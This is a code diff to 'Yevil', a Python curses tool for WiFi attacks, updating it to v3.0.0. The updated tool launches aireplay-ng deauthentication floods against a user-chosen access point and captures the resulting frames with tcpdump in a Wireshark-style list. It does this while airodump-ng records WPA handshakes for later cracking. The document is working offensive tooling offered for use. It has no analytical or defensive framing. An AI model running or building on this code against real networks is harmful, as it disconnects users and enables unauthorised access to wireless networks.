@@ -1,10 +1,10 @@
 #!/usr/bin/env python3
 """
-Yevil - Real‑time WiFi Scanner v2.8.0
+Yevil - Real‑time WiFi Scanner v3.0.0
 - Curses TUI for live scanning.
 - Persistent AP summary after exit.
 - Select AP for focused scan + deauth attack + handshake detection.
-- Deauth progress shown in a clean curses window (no scrolling).
+- Wireshark-style packet list for deauth frames.
 - Shows adapter interface with driver/bus info.
 - Auto reset monitor mode after scan.
 """
@@ -17,6 +17,7 @@ import time
 import glob
 import curses
 from collections import defaultdict
+from datetime import datetime
 
 # ============================================
 # GLOBALS
@@ -293,16 +294,44 @@ def print_final_summary():
     print("\033[96m" + "=" * 80 + "\033[0m\n")
 
 # ============================================
-# DEAUTH CURSES PROGRESS
+# WIRESHARK-STYLE DEAUTH PACKET LIST
 # ============================================
 
-def deauth_curses(stdscr, bssid, channel, interface, count):
-    """Curses window showing deauth progress."""
+def deauth_packet_list(stdscr, bssid, channel, interface, count):
+    """
+    Display deauth packets in a Wireshark-style packet list.
+    Columns: #, Time, Source, Destination, Protocol, Info
+    """
     curses.curs_set(0)
     stdscr.nodelay(True)
     stdscr.timeout(100)
 
-    # Start the deauth process
+    # Color pairs for packet list
+    curses.init_pair(5, curses.COLOR_GREEN, -1)   # Deauth packets
+    curses.init_pair(6, curses.COLOR_YELLOW, -1)  # Highlight
+    curses.init_pair(7, curses.COLOR_CYAN, -1)    # Headers
+
+    # Start tcpdump to capture deauth frames in real-time
+    # Filter: wlan subtype 12 (deauth) and BSSID
+    cmd_tcpdump = [
+        'sudo', 'tcpdump', '-i', interface,
+        '-l', '-n', '-e',
+        'wlan subtype 12 and wlan addr3 ' + bssid
+    ]
+
+    proc = subprocess.Popen(cmd_tcpdump,
+                            stdout=subprocess.PIPE,
+                            stderr=subprocess.DEVNULL,
+                            text=True,
+                            bufsize=1)
+
+    packets = []
+    start_time = time.time()
+    packet_num = 0
+    abort = False
+    scroll_offset = 0
+
+    # Also start aireplay-ng for deauth
     cmd_deauth = [
         'sudo', 'aireplay-ng',
         '-0', str(count),
@@ -310,32 +339,41 @@ def deauth_curses(stdscr, bssid, channel, interface, count):
         '--ignore-negative-one',
         interface
     ]
-    proc = subprocess.Popen(cmd_deauth,
-                            stdout=subprocess.PIPE,
-                            stderr=subprocess.STDOUT,
-                            text=True,
-                            bufsize=1)
-
-    packet_num = 0
-    latest_line = "Waiting for deauth output..."
-    abort = False
+    deauth_proc = subprocess.Popen(cmd_deauth,
+                                   stdout=subprocess.DEVNULL,
+                                   stderr=subprocess.DEVNULL)
 
     while True:
         # Check for key press
         key = stdscr.getch()
-        if key in (ord('q'), ord('Q'), 3):  # q or Ctrl+C
+        if key in (ord('q'), ord('Q'), 3):
             abort = True
-            proc.terminate()
             break
+        elif key == curses.KEY_DOWN:
+            scroll_offset += 1
+        elif key == curses.KEY_UP:
+            scroll_offset = max(0, scroll_offset - 1)
 
-        # Read non‑blocking from stdout
+        # Read from tcpdump
         try:
             line = proc.stdout.readline()
             if line:
                 line = line.strip()
                 if line:
-                    packet_num += 1
-                    latest_line = line
+                    # Parse tcpdump output
+                    # Example:
+                    # 17:55:06.123456 00:11:22:33:44:55 > ff:ff:ff:ff:ff:ff, Deauthentication, Reason: 7
+                    parsed = parse_tcpdump_line(line)
+                    if parsed:
+                        packet_num += 1
+                        packets.append({
+                            'num': packet_num,
+                            'time': parsed['time'],
+                            'source': parsed['source'],
+                            'destination': parsed['dest'],
+                            'protocol': 'Deauth',
+                            'info': parsed['info']
+                        })
         except:
             pass
 
@@ -343,33 +381,88 @@ def deauth_curses(stdscr, bssid, channel, interface, count):
         stdscr.erase()
         max_y, max_x = stdscr.getmaxyx()
 
-        title = "=== YEVIL - DEAUTH ATTACK ==="
-        stdscr.addstr(0, max(0, (max_x - len(title)) // 2), title, curses.A_BOLD | curses.color_pair(4))
+        # Title
+        title = "=== YEVIL - DEAUTH PACKET CAPTURE ==="
+        stdscr.addstr(0, max(0, (max_x - len(title)) // 2), title, curses.A_BOLD | curses.color_pair(7))
 
-        info = f"Target AP: {bssid}  |  Channel: {channel}  |  Interface: {interface}"
-        stdscr.addstr(2, 2, info[:max_x - 4])
+        # Info line
+        info = f"Target: {bssid}  |  Channel: {channel}  |  Interface: {interface}  |  Packets: {len(packets)}"
+        stdscr.addstr(1, 2, info[:max_x - 4], curses.color_pair(7))
 
-        progress = f"Packets sent: {packet_num} / {count}"
-        stdscr.addstr(4, 2, progress[:max_x - 4])
+        # Column headers (Wireshark style)
+        header = f"{'#':<6} {'Time':<12} {'Source':<18} {'Destination':<18} {'Protocol':<10} {'Info'}"
+        stdscr.addstr(3, 0, header[:max_x - 1], curses.A_BOLD | curses.color_pair(7))
+        stdscr.addstr(4, 0, "-" * min(max_x - 1, 80), curses.color_pair(7))
 
-        # Show latest deauth line (truncated)
-        display_line = latest_line[:max_x - 6]
-        stdscr.addstr(6, 2, f"Latest: {display_line}")
+        # Packet list
+        start_idx = scroll_offset
+        end_idx = min(start_idx + (max_y - 7), len(packets))
 
-        # Status / instructions
-        if proc.poll() is not None:
-            stdscr.addstr(8, 2, "Deauth process finished.")
-            break
-        else:
-            stdscr.addstr(8, 2, "Press 'q' to abort.")
+        for i in range(start_idx, end_idx):
+            pkt = packets[i]
+            row = f"{pkt['num']:<6} {pkt['time']:<12} {pkt['source']:<18} {pkt['destination']:<18} {pkt['protocol']:<10} {pkt['info']}"
+            # Highlight based on source
+            color = curses.color_pair(5)
+            stdscr.addstr(i - start_idx + 5, 0, row[:max_x - 1], color)
+
+        # Status line
+        status = f"Packets: {len(packets)}  |  Deauth process: {'Running' if deauth_proc.poll() is None else 'Finished'}"
+        stdscr.addstr(max_y - 2, 2, status[:max_x - 4], curses.color_pair(7))
+        stdscr.addstr(max_y - 1, 2, "↑/↓ scroll | q to quit", curses.color_pair(7))
 
         stdscr.refresh()
-        time.sleep(0.1)
 
-    # Wait for process to end if not already
-    proc.wait()
-    # Give a moment for user to see final status
-    time.sleep(1)
+        # Check if deauth process finished
+        if deauth_proc.poll() is not None and not proc.stdout.readable():
+            # Give it a moment to flush remaining packets
+            time.sleep(0.5)
+            break
+
+        time.sleep(0.05)
+
+    # Cleanup
+    proc.terminate()
+    deauth_proc.terminate()
+    time.sleep(0.5)
+    if proc.poll() is None:
+        proc.kill()
+    if deauth_proc.poll() is None:
+        deauth_proc.kill()
+
+    return packets
+
+
+def parse_tcpdump_line(line):
+    """Parse a tcpdump line for deauth frames."""
+    # Example: 17:55:06.123456 00:11:22:33:44:55 > ff:ff:ff:ff:ff:ff, Deauthentication, Reason: 7
+    try:
+        # Extract time
+        time_match = re.match(r'(\d{2}:\d{2}:\d{2}\.\d+)', line)
+        if not time_match:
+            return None
+        time_str = time_match.group(1)
+
+        # Extract MACs
+        mac_pattern = r'([0-9A-Fa-f]{2}:[0-9A-Fa-f]{2}:[0-9A-Fa-f]{2}:[0-9A-Fa-f]{2}:[0-9A-Fa-f]{2}:[0-9A-Fa-f]{2})'
+        macs = re.findall(mac_pattern, line)
+        if len(macs) < 2:
+            return None
+
+        source = macs[0]
+        dest = macs[1] if len(macs) > 1 else "Broadcast"
+
+        # Extract reason
+        reason_match = re.search(r'Reason:\s*(\d+)', line)
+        reason = reason_match.group(1) if reason_match else "?"
+
+        return {
+            'time': time_str,
+            'source': source,
+            'dest': dest,
+            'info': f"Reason: {reason}"
+        }
+    except:
+        return None
 
 
 # ============================================
@@ -377,7 +470,7 @@ def deauth_curses(stdscr, bssid, channel, interface, count):
 # ============================================
 
 def run_targeted_scan(bssid, channel, interface):
-    """Launch focused scan + deauth attack (curses progress), then check for handshake."""
+    """Launch focused scan + deauth attack, then check for handshake."""
     try:
         count = input("[?] Number of deauth packets to send (default 20): ").strip()
         if count == "":
@@ -412,12 +505,12 @@ def run_targeted_scan(bssid, channel, interface):
     airo_proc = subprocess.Popen(cmd_airodump, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
     time.sleep(2)
 
-    # Run deauth with curses progress
-    print("[+] Launching deauth progress window...")
-    curses.wrapper(deauth_curses, bssid, channel, interface, count)
+    # Run deauth with Wireshark-style packet list
+    print("[+] Launching Wireshark-style packet list...")
+    curses.wrapper(deauth_packet_list, bssid, channel, interface, count)
 
-    print("[+] Waiting 5 seconds for potential reconnection...")
-    time.sleep(5)
+    print("[+] Waiting 3 seconds for potential reconnection...")
+    time.sleep(3)
 
     print("[+] Stopping capture...")
     airo_proc.terminate()
